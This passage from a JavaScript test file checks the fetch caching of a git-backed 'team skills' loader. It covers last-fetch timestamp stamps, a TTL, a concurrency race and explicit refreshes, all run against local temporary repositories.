  const ctx = makeSkillsRepoWithHome(t);
  const sha1 = execFileSync('git', ['rev-parse', 'HEAD'], { cwd: ctx.srcDir, encoding: 'utf8' }).trim();
  await refreshTeamSkills(ctx.makeProjectRoot());
  const stampPath = lastFetchStampPath(bareDirFor(ctx.srcDir));
  assert.ok(existsSync(stampPath), 'refresh must persist a last-fetch stamp');

  const sha2 = ctx.commit('second');
  assert.notEqual(sha2, sha1);

  const seen = childTeamSkillCommit(ctx.home, ctx.makeProjectRoot());
  assert.equal(seen, sha1, 'fresh stamp must suppress fetch in a brand-new process');
});

test('a new process with a stale stamp fetches once and rewrites the stamp (#367)', async (t) => {
  const ctx = makeSkillsRepoWithHome(t);
  await refreshTeamSkills(ctx.makeProjectRoot());
  const sha2 = ctx.commit('second');
  const stampPath = lastFetchStampPath(bareDirFor(ctx.srcDir));
  const before = Number(readFileSync(stampPath, 'utf8').trim());
  writeFileSync(stampPath, `${before - PASSIVE_FETCH_TTL_MS - 1}\n`);

  const seen = childTeamSkillCommit(ctx.home, ctx.makeProjectRoot());
  assert.equal(seen, sha2);
  const after = Number(readFileSync(stampPath, 'utf8').trim());
  assert.ok(after > before, 'stale-stamp fetch must rewrite the stamp');
});

test('a concurrent sibling success does not block the later TTL fetch (#367)', async (t) => {
  const ctx = makeSkillsRepoWithHome(t);
  await Promise.all([waitForTeamSkills(ctx.makeProjectRoot()), waitForTeamSkills(ctx.makeProjectRoot())]);
  // Reproduce the review race: a loser recorded cloneAttempted after a
  // sibling already wrote a fresh stamp. The next catalog read must drop
  // that flag so a later TTL still fetches.
  __markCloneAttemptedForTests(ctx.srcDir);
  await waitForTeamSkills(ctx.makeProjectRoot());

  const sha2 = ctx.commit('second');
  const stampPath = lastFetchStampPath(bareDirFor(ctx.srcDir));
  const before = Number(readFileSync(stampPath, 'utf8').trim());
  writeFileSync(stampPath, `${before - PASSIVE_FETCH_TTL_MS - 1}\n`);

  const loaded = await waitForTeamSkills(ctx.makeProjectRoot());
  assert.equal(
    loaded.find((s) => s.name === 'greeter')?.team?.commit,
    sha2,
    'a failed concurrent first-load must not leave cloneAttempted blocking the TTL',
  );
});

test('refreshTeamSkills fetches even when the stamp is still fresh (#367)', async (t) => {
  const ctx = makeSkillsRepoWithHome(t);
  const sha1 = execFileSync('git', ['rev-parse', 'HEAD'], { cwd: ctx.srcDir, encoding: 'utf8' }).trim();
  const root = ctx.makeProjectRoot();
  await refreshTeamSkills(root);
  const sha2 = ctx.commit('second');
  assert.notEqual(sha2, sha1);

  const loaded = await refreshTeamSkills(root);
  const greeter = loaded.find((s) => s.name === 'greeter');
  assert.equal(greeter?.team?.commit, sha2);
});
